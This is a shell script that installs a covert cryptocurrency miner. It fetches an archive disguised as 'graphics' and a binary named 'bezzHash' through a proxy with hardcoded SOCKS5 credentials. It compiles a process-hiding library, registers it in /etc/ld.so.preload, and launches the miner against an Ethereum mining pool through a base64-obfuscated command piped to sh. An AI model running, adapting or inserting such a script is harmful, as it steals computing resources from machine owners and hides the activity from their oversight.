#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  2.56.120.93:5205
socks5_username = hadi0139
socks5_password = buatthr2022
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuTEFQSUBldGgtdXMtd2VzdC5mbGV4cG9vbC5pbzo1NTU1IC0tbG9nIC0tZXh0cmEgLS1sYXRlbmN5IC0tYWxsLXNoYXJlcyAtLXNoYXJlcy1kZXRhaWwgLS1zaG93LW1vZGUgLS1saXN0LW1vZGVzIC0tbW9kZT05OQ== | sh
